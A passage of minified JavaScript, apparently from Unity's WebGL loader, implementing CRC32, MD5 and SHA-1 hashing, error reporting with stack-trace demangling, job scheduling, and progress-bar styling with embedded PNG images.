          return e.data.ready ? void URL.revokeObjectURL(n) : (this.callbacks[e.data.id](e.data.decompressed), void delete this.callbacks[e.data.id])
        }, r.worker.callbacks = {}, r.worker.nextCallbackId = 0
      }
      var o = r.worker.nextCallbackId++;
      r.worker.callbacks[o] = t, r.worker.postMessage({
        id: o,
        compressed: e
      }, [e.buffer])
    },
    serverSetupWarningEnabled: !0
  },
  Cryptography: {
    crc32: function(e) {
      var t = UnityLoader.Cryptography.crc32.module;
      if (!t) {
        var r = new ArrayBuffer(16777216),
          n = function(e, t, r) {
            "use asm";
            var n = new e.Uint8Array(r);
            var o = new e.Uint32Array(r);

            function i(e, t) {
              e = e | 0;
              t = t | 0;
              var r = 0;
              for (r = o[1024 >> 2] | 0; t; e = e + 1 | 0, t = t - 1 | 0) r = o[(r & 255 ^ n[e]) << 2 >> 2] ^ r >>> 8 ^ 4278190080;
              o[1024 >> 2] = r
            }
            return {
              process: i
            }
          }({
            Uint8Array: Uint8Array,
            Uint32Array: Uint32Array
          }, null, r);
        t = UnityLoader.Cryptography.crc32.module = {
          buffer: r,
          HEAPU8: new Uint8Array(r),
          HEAPU32: new Uint32Array(r),
          process: n.process,
          crc32: 1024,
          data: 1028
        };
        for (var o = 0; o < 256; o++) {
          for (var i = 255 ^ o, a = 0; a < 8; a++) i = i >>> 1 ^ (1 & i ? 3988292384 : 0);
          t.HEAPU32[o] = i
        }
      }
      t.HEAPU32[t.crc32 >> 2] = 0;
      for (var s = 0; s < e.length;) {
        var d = Math.min(t.HEAPU8.length - t.data, e.length - s);
        t.HEAPU8.set(e.subarray(s, s + d), t.data), crc = t.process(t.data, d), s += d
      }
      var l = t.HEAPU32[t.crc32 >> 2];
      return new Uint8Array([l >> 24, l >> 16, l >> 8, l])
    },
    md5: function(e) {
      var t = UnityLoader.Cryptography.md5.module;
      if (!t) {
        var r = new ArrayBuffer(16777216),
          n = function(e, t, r) {
            "use asm";
            var n = new e.Uint32Array(r);

            function o(e, t) {
              e = e | 0;
              t = t | 0;
              var r = 0,
                o = 0,
                i = 0,
                a = 0,
                s = 0,
                d = 0,
                l = 0,
                u = 0,
                c = 0,
                f = 0,
                h = 0,
                p = 0;
              r = n[128] | 0, o = n[129] | 0, i = n[130] | 0, a = n[131] | 0;
              for (; t; e = e + 64 | 0, t = t - 1 | 0) {
                s = r;
                d = o;
                l = i;
                u = a;
                for (f = 0;
                  (f | 0) < 512; f = f + 8 | 0) {
                  p = n[f >> 2] | 0;
                  r = r + (n[f + 4 >> 2] | 0) + (n[e + (p >>> 14) >> 2] | 0) + ((f | 0) < 128 ? a ^ o & (i ^ a) : (f | 0) < 256 ? i ^ a & (o ^ i) : (f | 0) < 384 ? o ^ i ^ a : i ^ (o | ~a)) | 0;
                  h = (r << (p & 31) | r >>> 32 - (p & 31)) + o | 0;
                  r = a;
                  a = i;
                  i = o;
                  o = h
                }
                r = r + s | 0;
                o = o + d | 0;
                i = i + l | 0;
                a = a + u | 0
              }
              n[128] = r;
              n[129] = o;
              n[130] = i;
              n[131] = a
            }
            return {
              process: o
            }
          }({
            Uint32Array: Uint32Array
          }, null, r);
        t = UnityLoader.Cryptography.md5.module = {
          buffer: r,
          HEAPU8: new Uint8Array(r),
          HEAPU32: new Uint32Array(r),
          process: n.process,
          md5: 512,
          data: 576
        }, t.HEAPU32.set(new Uint32Array([7, 3614090360, 65548, 3905402710, 131089, 606105819, 196630, 3250441966, 262151, 4118548399, 327692, 1200080426, 393233, 2821735955, 458774, 4249261313, 524295, 1770035416, 589836, 2336552879, 655377, 4294925233, 720918, 2304563134, 786439, 1804603682, 851980, 4254626195, 917521, 2792965006, 983062, 1236535329, 65541, 4129170786, 393225, 3225465664, 720910, 643717713, 20, 3921069994, 327685, 3593408605, 655369, 38016083, 983054, 3634488961, 262164, 3889429448, 589829, 568446438, 917513, 3275163606, 196622, 4107603335, 524308, 1163531501, 851973, 2850285829, 131081, 4243563512, 458766, 1735328473, 786452, 2368359562, 327684, 4294588738, 524299, 2272392833, 720912, 1839030562, 917527, 4259657740, 65540, 2763975236, 262155, 1272893353, 458768, 4139469664, 655383, 3200236656, 851972, 681279174, 11, 3936430074, 196624, 3572445317, 393239, 76029189, 589828, 3654602809, 786443, 3873151461, 983056, 530742520, 131095, 3299628645, 6, 4096336452, 458762, 1126891415, 917519, 2878612391, 327701, 4237533241, 786438, 1700485571, 196618, 2399980690, 655375, 4293915773, 65557, 2240044497, 524294, 1873313359, 983050, 4264355552, 393231, 2734768916, 851989, 1309151649, 262150, 4149444226, 720906, 3174756917, 131087, 718787259, 589845, 3951481745]))
      }
      t.HEAPU32.set(new Uint32Array([1732584193, 4023233417, 2562383102, 271733878]), t.md5 >> 2);
      for (var o = 0; o < e.length;) {
        var i = Math.min(t.HEAPU8.length - t.data, e.length - o) & -64;
        if (t.HEAPU8.set(e.subarray(o, o + i), t.data), o += i, t.process(t.data, i >> 6), e.length - o < 64) {
          if (i = e.length - o, t.HEAPU8.set(e.subarray(e.length - i, e.length), t.data), o += i, t.HEAPU8[t.data + i++] = 128, i > 56) {
            for (var a = i; a < 64; a++) t.HEAPU8[t.data + a] = 0;
            t.process(t.data, 1), i = 0
          }
          for (var a = i; a < 64; a++) t.HEAPU8[t.data + a] = 0;
          for (var s = e.length, d = 0, a = 56; a < 64; a++, d = (224 & s) >> 5, s /= 256) t.HEAPU8[t.data + a] = ((31 & s) << 3) + d;
          t.process(t.data, 1)
        }
      }
      return new Uint8Array(t.HEAPU8.subarray(t.md5, t.md5 + 16))
    },
    sha1: function(e) {
      var t = UnityLoader.Cryptography.sha1.module;
      if (!t) {
        var r = new ArrayBuffer(16777216),
          n = function(e, t, r) {
            "use asm";
            var n = new e.Uint32Array(r);

            function o(e, t) {
              e = e | 0;
              t = t | 0;
              var r = 0,
                o = 0,
                i = 0,
                a = 0,
                s = 0,
                d = 0,
                l = 0,
                u = 0,
                c = 0,
                f = 0,
                h = 0,
                p = 0;
              r = n[80] | 0, o = n[81] | 0, i = n[82] | 0, a = n[83] | 0, s = n[84] | 0;
              for (; t; e = e + 64 | 0, t = t - 1 | 0) {
                d = r;
                l = o;
                u = i;
                c = a;
                f = s;
                for (p = 0;
                  (p | 0) < 320; p = p + 4 | 0, s = a, a = i, i = o << 30 | o >>> 2, o = r, r = h) {
                  if ((p | 0) < 64) {
                    h = n[e + p >> 2] | 0;
                    h = h << 24 & 4278190080 | h << 8 & 16711680 | h >>> 8 & 65280 | h >>> 24 & 255
                  } else {
                    h = n[p - 12 >> 2] ^ n[p - 32 >> 2] ^ n[p - 56 >> 2] ^ n[p - 64 >> 2];
                    h = h << 1 | h >>> 31
                  }
                  n[p >> 2] = h;
                  h = h + ((r << 5 | r >>> 27) + s) + ((p | 0) < 80 ? (o & i | ~o & a | 0) + 1518500249 | 0 : (p | 0) < 160 ? (o ^ i ^ a) + 1859775393 | 0 : (p | 0) < 240 ? (o & i | o & a | i & a) + 2400959708 | 0 : (o ^ i ^ a) + 3395469782 | 0) | 0
                }
                r = r + d | 0;
                o = o + l | 0;
                i = i + u | 0;
                a = a + c | 0;
                s = s + f | 0
              }
              n[80] = r;
              n[81] = o;
              n[82] = i;
              n[83] = a;
              n[84] = s
            }
            return {
              process: o
            }
          }({
            Uint32Array: Uint32Array
          }, null, r);
        t = UnityLoader.Cryptography.sha1.module = {
          buffer: r,
          HEAPU8: new Uint8Array(r),
          HEAPU32: new Uint32Array(r),
          process: n.process,
          sha1: 320,
          data: 384
        }
      }
      t.HEAPU32.set(new Uint32Array([1732584193, 4023233417, 2562383102, 271733878, 3285377520]), t.sha1 >> 2);
      for (var o = 0; o < e.length;) {
        var i = Math.min(t.HEAPU8.length - t.data, e.length - o) & -64;
        if (t.HEAPU8.set(e.subarray(o, o + i), t.data), o += i, t.process(t.data, i >> 6), e.length - o < 64) {
          if (i = e.length - o, t.HEAPU8.set(e.subarray(e.length - i, e.length), t.data), o += i, t.HEAPU8[t.data + i++] = 128, i > 56) {
            for (var a = i; a < 64; a++) t.HEAPU8[t.data + a] = 0;
            t.process(t.data, 1), i = 0
          }
          for (var a = i; a < 64; a++) t.HEAPU8[t.data + a] = 0;
          for (var s = e.length, d = 0, a = 63; a >= 56; a--, d = (224 & s) >> 5, s /= 256) t.HEAPU8[t.data + a] = ((31 & s) << 3) + d;
          t.process(t.data, 1)
        }
      }
      for (var l = new Uint8Array(20), a = 0; a < l.length; a++) l[a] = t.HEAPU8[t.sha1 + (a & -4) + 3 - (3 & a)];
      return l
    }
  },
  Error: {
    init: function() {
      return Error.stackTraceLimit = 50, window.addEventListener("error", function(e) {
        var t = UnityLoader.Error.getModule(e);
        if (!t) return UnityLoader.Error.handler(e);
        var r = t.useWasm ? t.wasmSymbolsUrl : t.asmSymbolsUrl;
        if (!r) return UnityLoader.Error.handler(e, t);
        var n = new XMLHttpRequest;
        n.open("GET", t.resolveBuildUrl(r)), n.responseType = "arraybuffer", n.onload = function() {
          UnityLoader.loadCode(t, UnityLoader.Compression.decompress(new Uint8Array(n.response)), function(r) {
            t.demangleSymbol = UnityLoader[r](), UnityLoader.Error.handler(e, t)
          }, {
            isModularized: !1
          })
        }, n.send()
      }), !0
    }(),
    stackTraceFormat: navigator.userAgent.indexOf("Chrome") != -1 ? "(\\s+at\\s+)(([\\w\\d_\\.]*?)([\\w\\d_$]+)(/[\\w\\d_\\./]+|))(\\s+\\[.*\\]|)\\s*\\((blob:.*)\\)" : "(\\s*)(([\\w\\d_\\.]*?)([\\w\\d_$]+)(/[\\w\\d_\\./]+|))(\\s+\\[.*\\]|)\\s*@(blob:.*)",
    stackTraceFormatWasm: navigator.userAgent.indexOf("Chrome") != -1 ? "((\\s+at\\s*)\\s\\(<WASM>\\[(\\d+)\\]\\+\\d+\\))()" : "((\\s*)wasm-function\\[(\\d+)\\])@(blob:.*)",
    blobParseRegExp: new RegExp("^(blob:.*)(:\\d+:\\d+)$"),
    getModule: function(e) {
      var t = e.message.match(new RegExp(this.stackTraceFormat, "g"));
      for (var r in t) {
        var n = t[r].match(new RegExp("^" + this.stackTraceFormat + "$")),
          o = n[7].match(this.blobParseRegExp);
        if (o && UnityLoader.Blobs[o[1]] && UnityLoader.Blobs[o[1]].Module) return UnityLoader.Blobs[o[1]].Module
      }
    },
    demangle: function(e, t) {
      var r = e.message;
      return t ? (r = r.replace(new RegExp(this.stackTraceFormat, "g"), function(e) {
        var r = e.match(new RegExp("^" + this.stackTraceFormat + "$")),
          n = r[7].match(this.blobParseRegExp),
          o = t.demangleSymbol ? t.demangleSymbol(r[4]) : r[4],
          i = n && UnityLoader.Blobs[n[1]] && UnityLoader.Blobs[n[1]].url ? UnityLoader.Blobs[n[1]].url : "blob";
        return r[1] + o + (r[2] != o ? " [" + r[2] + "]" : "") + " (" + (n ? i.substr(i.lastIndexOf("/") + 1) + n[2] : r[7]) + ")"
      }.bind(this)), t.useWasm && (r = r.replace(new RegExp(this.stackTraceFormatWasm, "g"), function(e) {
        var r = e.match(new RegExp("^" + this.stackTraceFormatWasm + "$")),
          n = t.demangleSymbol ? t.demangleSymbol(r[3]) : r[3],
          o = r[4].match(this.blobParseRegExp),
          i = o && UnityLoader.Blobs[o[1]] && UnityLoader.Blobs[o[1]].url ? UnityLoader.Blobs[o[1]].url : "blob";
        return (n == r[3] ? r[1] : r[2] + n + " [wasm:" + r[3] + "]") + (r[4] ? " (" + (o ? i.substr(i.lastIndexOf("/") + 1) + o[2] : r[4]) + ")" : "")
      }.bind(this))), r) : r
    },
    handler: function(e, t) {
      var r = t ? this.demangle(e, t) : e.message;
      if (!(t && t.errorhandler && t.errorhandler(r, e.filename, e.lineno) || (console.log("Invoking error handler due to\n" + r), "function" == typeof dump && dump("Invoking error handler due to\n" + r), r.indexOf("UnknownError") != -1 || r.indexOf("Program terminated with exit(0)") != -1 || this.didShowErrorMessage))) {
        var r = "An error occurred running the Unity content on this page. See your browser JavaScript console for more info. The error was:\n" + r;
        r.indexOf("DISABLE_EXCEPTION_CATCHING") != -1 ? r = "An exception has occurred, but exception handling has been disabled in this build. If you are the developer of this content, enable exceptions in your project WebGL player settings to be able to catch the exception or see the stack trace." : r.indexOf("Cannot enlarge memory arrays") != -1 ? r = "Out of memory. If you are the developer of this content, try allocating more memory to your WebGL build in the WebGL player settings." : r.indexOf("Invalid array buffer length") == -1 && r.indexOf("Invalid typed array length") == -1 && r.indexOf("out of memory") == -1 && r.indexOf("could not allocate memory") == -1 || (r = "The browser could not allocate enough memory for the WebGL content. If you are the developer of this content, try allocating less memory to your WebGL build in the WebGL player settings."), alert(r), this.didShowErrorMessage = !0
      }
    },
    popup: function(e, t, r) {
      r = r || [{
        text: "OK"
      }];
      var n = document.createElement("div");
      n.style.cssText = "position: absolute; top: 50%; left: 50%; -webkit-transform: translate(-50%, -50%); transform: translate(-50%, -50%); text-align: center; border: 1px solid black; padding: 5px; background: #E8E8E8";
      var o = document.createElement("span");
      o.textContent = t, n.appendChild(o), n.appendChild(document.createElement("br"));
      for (var i = 0; i < r.length; i++) {
        var a = document.createElement("button");
        r[i].text && (a.textContent = r[i].text), r[i].callback && (a.onclick = r[i].callback), a.style.margin = "5px", a.addEventListener("click", function() {
          e.container.removeChild(n)
        }), n.appendChild(a)
      }
      e.container.appendChild(n)
    }
  },
  Job: {
    schedule: function(e, t, r, n, o) {
      o = o || {};
      var i = e.Jobs[t];
      if (i || (i = e.Jobs[t] = {
          dependencies: {},
          dependants: {}
        }), i.callback) throw "[UnityLoader.Job.schedule] job '" + t + "' has been already scheduled";
      if ("function" != typeof n) throw "[UnityLoader.Job.schedule] job '" + t + "' has invalid callback";
      if ("object" != typeof o) throw "[UnityLoader.Job.schedule] job '" + t + "' has invalid parameters";
      i.callback = function(e, t) {
        i.starttime = performance.now(), n(e, t)
      }, i.parameters = o, i.complete = function(r) {
        i.endtime = performance.now(), i.result = {
          value: r
        };
        for (var n in i.dependants) {
          var o = e.Jobs[n];
          o.dependencies[t] = i.dependants[n] = !1;
          var a = "function" != typeof o.callback;
          for (var s in o.dependencies) a = a || o.dependencies[s];
          if (!a) {
            if (o.executed) throw "[UnityLoader.Job.schedule] job '" + t + "' has already been executed";
            o.executed = !0, setTimeout(o.callback.bind(null, e, o), 0)
          }
        }
      };
      var a = !1;
      r.forEach(function(r) {
        var n = e.Jobs[r];
        n || (n = e.Jobs[r] = {
          dependencies: {},
          dependants: {}
        }), (i.dependencies[r] = n.dependants[t] = !n.result) && (a = !0)
      }), a || (i.executed = !0, setTimeout(i.callback.bind(null, e, i), 0))
    },
    result: function(e, t) {
      var r = e.Jobs[t];
      if (!r) throw "[UnityLoader.Job.result] job '" + t + "' does not exist";
      if ("object" != typeof r.result) throw "[UnityLoader.Job.result] job '" + t + "' has invalid result";
      return r.result.value
    }
  },
  Progress: {
    Styles: {
      Dark: {
        progressLogoUrl: "data:image/png;base64,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",
        progressEmptyUrl: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAI0AAAASCAYAAABmbl0zAAAACXBIWXMAAAsSAAALEgHS3X78AAAATUlEQVRo3u3aIQ4AIAwEQUr4/5cPiyMVBDOj0M2mCKgkGdAwjYCudZzLOLiITYPrCdEgGkSDaEA0iAbRIBpEA6JBNHx1vnL7V4NNwxsbCNMGI3YImu0AAAAASUVORK5CYII=",
        progressFullUrl: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAI0AAAASCAYAAABmbl0zAAAACXBIWXMAAAsSAAALEgHS3X78AAAAO0lEQVRo3u3SQREAAAjDMMC/56EB3omEXjtJCg5GAkyDaTANpsE0YBpMg2kwDaYB02AaTINpMA2Yhr8FO18EIBpZMeQAAAAASUVORK5CYII="
      },
      Light: {
        progressLogoUrl: "data:image/png;base64,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",
        progressEmptyUrl: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAI0AAAASCAYAAABmbl0zAAAACXBIWXMAAAsSAAALEgHS3X78AAAAUUlEQVRo3u3aMQ4AEAxAUcRJzGb3v1mt3cQglvcmc/NTA3XMFQUuNCPgVk/nahwchE2D6wnRIBpEg2hANIgG0SAaRAOiQTR8lV+5/avBpuGNDcz6A6oq1CgNAAAAAElFTkSuQmCC",
        progressFullUrl: "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAI0AAAASCAYAAABmbl0zAAAACXBIWXMAAAsSAAALEgHS3X78AAAAQElEQVRo3u3SMREAMAgAsVIpnTvj3xlogDmR8PfxftaBgSsBpsE0mAbTYBowDabBNJgG04BpMA2mwTSYBkzDXgP/hgGnr4PpeAAAAABJRU5ErkJggg=="
      }
    },
    handler: function(e, t) {
      if (e.Module) {
        var r = UnityLoader.Progress.Styles[e.Module.splashScreenStyle],
          n = e.Module.progressLogoUrl ? e.Module.resolveBuildUrl(e.Module.progressLogoUrl) : r.progressLogoUrl,
          o = e.Module.progressEmptyUrl ? e.Module.resolveBuildUrl(e.Module.progressEmptyUrl) : r.progressEmptyUrl,
          i = e.Module.progressFullUrl ? e.Module.resolveBuildUrl(e.Module.progressFullUrl) : r.progressFullUrl,
          a = "position: absolute; left: 50%; top: 50%; -webkit-transform: translate(-50%, -50%); transform: translate(-50%, -50%);";
        e.logo || (e.logo = document.createElement("div"), e.logo.style.cssText = a + "background: url('" + n + "') no-repeat center / contain; width: 154px; height: 130px;", e.container.appendChild(e.logo)), e.progress || (e.progress = document.createElement("div"), e.progress.style.cssText = a + " height: 18px; width: 141px; margin-top: 90px;", e.progress.empty = document.createElement("div"), e.progress.empty.style.cssText = "background: url('" + o + "') no-repeat right / cover; float: right; width: 100%; height: 100%; display: inline-block;", e.progress.appendChild(e.progress.empty), e.progress.full = document.createElement("div"), e.progress.full.style.cssText = "background: url('" + i + "') no-repeat left / cover; float: left; width: 0%; height: 100%; display: inline-block;", e.progress.appendChild(e.progress.full), e.container.appendChild(e.progress)), e.progress.full.style.width = 100 * t + "%", e.progress.empty.style.width = 100 * (1 - t) + "%", 1 == t && (e.logo.style.display = e.progress.style.display = "none")
      }
    },
    update: function(e, t, r) {
      var n = e.buildDownloadProgress[t];
      n || (n = e.buildDownloadProgress[t] = {
        started: !1,
        finished: !1,
        lengthComputable: !1,
        total: 0,
        loaded: 0
